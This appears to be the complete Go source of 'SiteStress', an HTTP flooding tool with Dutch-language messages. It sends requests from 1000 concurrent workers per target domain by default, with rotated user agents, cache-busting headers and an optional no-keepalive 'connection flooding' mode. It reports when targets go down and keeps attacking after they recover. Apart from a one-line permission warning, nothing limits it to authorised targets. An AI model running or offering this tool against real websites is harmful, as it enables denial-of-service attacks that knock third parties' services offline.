package main

import (
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"

	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/miekg/dns"
)

const version = "3.3.0"

func printBanner() {
	fmt.Println("SiteStress (part of Lucas Kit) is made by Lucas Mangroelal | lucasmangroelal.nl")
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

type options struct {
	domain        string
	attackMinutes int
	concurrency   int
	noKeepAlive   bool
	outputDir     string
	help          bool
	version       bool
}

type domainStats struct {
	domain          string
	targetURL       string
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	siteDown        bool
	siteDownSince   time.Time
	mu              sync.Mutex
	statusLog       []string
}

func main() {
	var o options

	flag.StringVar(&o.domain, "d", "", "Domein(en) om aan te vallen (comma-separated, bijv. example.com,test.nl)")
	flag.IntVar(&o.attackMinutes, "t", 0, "Aantal minuten om aan te vallen (vereist)")
	flag.IntVar(&o.concurrency, "c", 1000, "Aantal gelijktijdige connecties (workers) per domein")
	flag.BoolVar(&o.noKeepAlive, "no-keepalive", false, "Schakel keep-alive uit (forceer nieuwe connecties voor meer stress)")
	flag.StringVar(&o.outputDir, "o", "", "Map om rapport en logs in op te slaan (optioneel)")
	flag.BoolVar(&o.help, "help", false, "Toon help")
	flag.BoolVar(&o.help, "h", false, "Toon help (kort)")
	flag.BoolVar(&o.version, "version", false, "Toon versie")

	flag.Usage = func() {
		printBanner()
		fmt.Fprintf(os.Stderr, "SiteStress v%s - Advanced HTTP Stress Test Tool\n\n", version)
		fmt.Fprintf(os.Stderr, "Gebruik:\n")
		fmt.Fprintf(os.Stderr, "  sitestress -d <domein> -t <minuten> [flags]\n\n")
		fmt.Fprintf(os.Stderr, "Voorbeelden:\n")
		fmt.Fprintf(os.Stderr, "  sitestress -d voorbeeld.nl -t 5\n")
		fmt.Fprintf(os.Stderr, "  sitestress -d voorbeeld.nl -t 10 -c 5000\n")
		fmt.Fprintf(os.Stderr, "  sitestress -d voorbeeld.nl -t 5 -no-keepalive\n\n")
		fmt.Fprintf(os.Stderr, "Flags:\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	if o.version {
		printBanner()
		fmt.Printf("Version: %s\n", version)
		os.Exit(0)
	}
	if o.help {
		flag.Usage()
		os.Exit(0)
	}

	if o.domain == "" || o.attackMinutes <= 0 {
		flag.Usage()
		os.Exit(2)
	}

	printBanner()
	fmt.Printf("Version: %s | Platform: %s/%s\n", version, runtime.GOOS, runtime.GOARCH)
	fmt.Println("⚠️  WAARSCHUWING: Gebruik dit alleen op systemen waar je toestemming voor hebt.")
	fmt.Println()

	domains := strings.Split(o.domain, ",")
	for i := range domains {
		domains[i] = normalizeDomain(domains[i])
	}

	if o.outputDir != "" {
		if err := os.MkdirAll(o.outputDir, 0755); err != nil {
			fmt.Printf("Fout bij maken output map: %v\n", err)
			os.Exit(1)
		}
	}

	runAttack(domains, o)
}

func normalizeDomain(d string) string {
	d = strings.TrimSpace(d)
	d = strings.TrimPrefix(d, "http://")
	d = strings.TrimPrefix(d, "https://")
	d = strings.TrimSuffix(d, "/")
	return strings.TrimSuffix(d, ".")
}

func runAttack(domains []string, o options) {
	duration := time.Duration(o.attackMinutes) * time.Minute
	deadline := time.Now().Add(duration)

	workersPerDomain := o.concurrency
	// Safety check if user puts in something crazy low
	if workersPerDomain < 1 {
		workersPerDomain = 1
	}

	// Sterk getunede HTTP client
	transport := &http.Transport{
		MaxIdleConns:        workersPerDomain * len(domains),
		MaxIdleConnsPerHost: workersPerDomain,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   o.noKeepAlive,
		ForceAttemptHTTP2:   true,
	}

	httpClient := &http.Client{
		Timeout:   5 * time.Second,
		Transport: transport,
	}

	// Setup DNS resolver (8.8.8.8 default)
	dnsClient := &dns.Client{Timeout: 2 * time.Second}
	resolver := "8.8.8.8:53"

	allStats := make([]*domainStats, len(domains))

	// Initial checks
	for i, domain := range domains {
		fmt.Printf("🔍 Initiele check voor %s...\n", domain)

		// DNS lookup
		var targetIPs []string
		m := new(dns.Msg)
		m.SetQuestion(dns.Fqdn(domain), dns.TypeA)
		in, _, err := dnsClient.Exchange(m, resolver)
		if err == nil && len(in.Answer) > 0 {
			for _, ans := range in.Answer {
				if a, ok := ans.(*dns.A); ok {
					targetIPs = append(targetIPs, a.A.String())
				}
			}
		}

		if len(targetIPs) == 0 {
			// Fallback: system lookup
			ips, _ := net.LookupHost(domain)
			if len(ips) > 0 {
				targetIPs = ips
			} else {
				fmt.Printf("⚠️  Geen IP adressen gevonden voor %s, we proberen het toch.\n", domain)
			}
		} else {
			fmt.Printf("📍 IPs: %s\n", strings.Join(targetIPs, ", "))
		}

		// URL bepalen
		urls := []string{"https://" + domain, "http://" + domain}
		var targetURL string
		for _, u := range urls {
			req, _ := http.NewRequest("GET", u, nil)
			req.Header.Set("User-Agent", getRandomUserAgent())
			resp, err := httpClient.Do(req)
			if err == nil {
				targetURL = u
				resp.Body.Close()
				break
			}
		}
		if targetURL == "" {
			targetURL = urls[0] // Fallback
		}

		allStats[i] = &domainStats{
			domain:    domain,
			targetURL: targetURL,
		}
		fmt.Printf("🎯 Target: %s\n", targetURL)
	}

	fmt.Printf("\n🚀 Starten aanval (%d workers per domein)...\n", workersPerDomain)
	if o.noKeepAlive {
		fmt.Println("🔥 Mode: No-KeepAlive (Connection flooding)")
	} else {
		fmt.Println("🌊 Mode: Keep-Alive (High throughput)")
	}
	fmt.Printf("⏱️  Totale tijd: %d minuten\n", o.attackMinutes)

	var globalWg sync.WaitGroup

	for _, stats := range allStats {
		if stats == nil {
			continue
		}
		s := stats
		for w := 0; w < workersPerDomain; w++ {
			globalWg.Add(1)
			go func() {
				defer globalWg.Done()

				for time.Now().Before(deadline) {
					req, _ := http.NewRequest("GET", s.targetURL, nil)
					req.Header.Set("User-Agent", getRandomUserAgent())
					req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")

					// Randomize connection header if keep alive is on, occasionally close to refresh?
					// For now rely on transport settings.

					resp, err := httpClient.Do(req)

					s.mu.Lock()
					isDown := s.siteDown
					s.mu.Unlock()

					if err != nil {
						// Connection error
						if !isDown {
							s.mu.Lock()
							if !s.siteDown {
								s.siteDown = true
								s.siteDownSince = time.Now()
								msg := fmt.Sprintf("[%s] 💥 %s is DOWN (connection error)!", time.Now().Format(time.TimeOnly), s.domain)
								s.statusLog = append(s.statusLog, msg)
								fmt.Println("\n" + msg)
							}
							s.mu.Unlock()
						}
						atomic.AddInt64(&s.failedRequests, 1)
					} else {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()

						if resp.StatusCode >= 500 || resp.StatusCode == 429 {
							if !isDown {
								s.mu.Lock()
								if !s.siteDown {
									s.siteDown = true
									s.siteDownSince = time.Now()
									msg := fmt.Sprintf("[%s] 💥 %s is DOWN (status %d)!", time.Now().Format(time.TimeOnly), s.domain, resp.StatusCode)
									s.statusLog = append(s.statusLog, msg)
									fmt.Println("\n" + msg)
								}
								s.mu.Unlock()
							}
							atomic.AddInt64(&s.failedRequests, 1)
						} else {
							// Site is UP
							if isDown {
								s.mu.Lock()
								if s.siteDown {
									downTime := time.Since(s.siteDownSince).Round(time.Second)
									s.siteDown = false
									msg := fmt.Sprintf("[%s] ✅ %s is weer ONLINE (was %v plat). Re-engaging...", time.Now().Format(time.TimeOnly), s.domain, downTime)
									s.statusLog = append(s.statusLog, msg)
									fmt.Println("\n" + msg)
								}
								s.mu.Unlock()
							}
							atomic.AddInt64(&s.successRequests, 1)
						}
					}
					atomic.AddInt64(&s.totalRequests, 1)
				}
			}()
		}
	}

	// Monitor loop
	ticker := time.NewTicker(2 * time.Second) // Sneller updaten voor leuk effect
	defer ticker.Stop()

	// Hier wachten we tot tijd voorbij is OF interrupt
	startTime := time.Now()
loop:
	for {
		select {
		case <-ticker.C:
			remaining := time.Until(deadline).Round(time.Second)
			if remaining <= 0 {
				break loop
			}
			elapsed := time.Since(startTime).Seconds()

			var totalReqs int64
			for _, s := range allStats {
				if s != nil {
					totalReqs += atomic.LoadInt64(&s.totalRequests)
				}
			}
			rps := float64(totalReqs) / elapsed

			fmt.Printf("\r⏳ Nog: %v | RPS: %.0f | ", remaining, rps)
			for i, s := range allStats {
				if s == nil {
					continue
				}
				if i > 0 {
					fmt.Print(" | ")
				}

				s.mu.Lock()
				status := "🟢"
				if s.siteDown {
					status = "🔴"
				}
				s.mu.Unlock()

				fmt.Printf("%s: %s (%d fail)", s.domain, status, atomic.LoadInt64(&s.failedRequests))
			}
		}
		if time.Now().After(deadline) {
			break
		}
	}

	fmt.Println("\n\n🛑 Tijd is om. Wachten op workers (kan even duren)...")
	globalWg.Wait()

	// Rapport genereren
	generateReport(allStats, o.outputDir, o.attackMinutes)
}

func generateReport(stats []*domainStats, outputDir string, minutes int) {
	fmt.Println("\n📊 EINDRESULTATEN")

	reportLines := []string{}
	reportLines = append(reportLines, fmt.Sprintf("SITESTRESS RAPPORT - %s", time.Now().Format(time.RFC1123)))
	reportLines = append(reportLines, fmt.Sprintf("Duur test: %d minuten", minutes))
	reportLines = append(reportLines, strings.Repeat("-", 50))

	for _, s := range stats {
		if s == nil {
			continue
		}

		total := atomic.LoadInt64(&s.totalRequests)
		success := atomic.LoadInt64(&s.successRequests)
		fail := atomic.LoadInt64(&s.failedRequests)

		summary := fmt.Sprintf("\nDOMEIN: %s", s.domain)
		fmt.Println(summary)
		reportLines = append(reportLines, summary)

		line1 := fmt.Sprintf("   Requests Totaal: %d", total)
		line2 := fmt.Sprintf("   Geslaagd (Up):   %d", success)
		line3 := fmt.Sprintf("   Gefaald (Down):  %d", fail)

		fmt.Println(line1)
		fmt.Println(line2)
		fmt.Println(line3)

		reportLines = append(reportLines, line1, line2, line3)
		reportLines = append(reportLines, "   Logboek:")

		s.mu.Lock()
		if len(s.statusLog) == 0 {
			msg := "   (Geen downtime events geregistreerd)"
			fmt.Println(msg)
			reportLines = append(reportLines, msg)
		} else {
			for _, log := range s.statusLog {
				fmt.Printf("   %s\n", log)
				reportLines = append(reportLines, "   "+log)
			}
		}
		s.mu.Unlock()
	}

	if outputDir != "" {
		fPath := filepath.Join(outputDir, fmt.Sprintf("report_%d.txt", time.Now().Unix()))
		f, err := os.Create(fPath)
		if err != nil {
			fmt.Printf("\n⚠️  Kon rapport niet opslaan: %v\n", err)
			return
		}
		defer f.Close()

		for _, line := range reportLines {
			f.WriteString(line + "\n")
		}
		fmt.Printf("\n💾 Rapport opgeslagen in: %s\n", fPath)
	}
}
